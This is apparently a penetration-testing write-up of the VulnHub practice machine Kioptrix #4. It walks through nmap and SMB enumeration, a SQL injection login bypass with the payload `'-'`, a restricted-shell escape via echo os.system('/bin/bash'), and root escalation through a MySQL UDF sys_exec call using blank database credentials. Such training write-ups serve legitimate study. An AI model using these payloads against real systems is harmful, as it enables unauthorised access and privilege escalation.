---
title: "VulnHub - Kioptrix #4"
author: Nasrallah
description: ""
date: 2023-01-09 00:00:00 +0000
categories: [VulnHub]
tags: [vulnhub, linux, easy, udf, mysql, sqli]
img_path: /assets/img/vulnhub/kioptrix4
---


---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Kioptrix level 4](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) from [VulnHub](https://www.vulnhub.com/).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 192.168.56.12                                                                                                                      [2/11]
Host is up (0.00020s latency).                                                                                                                                
Not shown: 39528 closed tcp ports (reset), 26003 filtered tcp ports (no-response)                                                                             
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 08:00:27:EC:F8:25 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h29m58s, deviation: 3h32m07s, median: -1s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2022-12-18T11:38:27-05:00

```

Found 4 open ports:

 - 22/tcp OpenSSH 4.7p1

 - 80/tcp Apache httpd 2.2.8

 - 139/tcp Samba

 - 445/tcp Samba smbd 3.0.28a


## Web

Let's navigate to the web page.

![](1.png)

We found a login page, i tried some default credentials but no luck.

## SMB

Let's enumerate for smb shares.

![](2.png)

Nothing interesting, let's enumerate users.

![](3.png)

We found user john and robert.

# **Foothold**

Back to the login page, i tried to login using one of the username with different password but didn't succeed.

Then tried a sql injection and logged in successfully using this payload as password: `'-'`

![](4.png)

Great! We got john's password, let's use it to ssh into the machine.

![](5.png)


# **Privilege Escalation**

After we logged in, we saw that we can't execute lot of commands, but one command we can exploit is `echo`.

To get a bash shell, run `echo os.system('/bin/bash')`

![](6.png)

Great! Now let's check the web file and see if we can find any passwords.

```bash
john@Kioptrix4:/var/www$ cat checklogin.php 
<?php                                                                          
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password                                                                                                                               
$db_name="members"; // Database name
$tbl_name="members"; // Table name

```

Sql uses default credentials root:(nopassword).

Using Mysql [UDF](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html), let's connect to mysql server and run the command `select sys_exec('usermod -a -G admin john');`

![](7.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
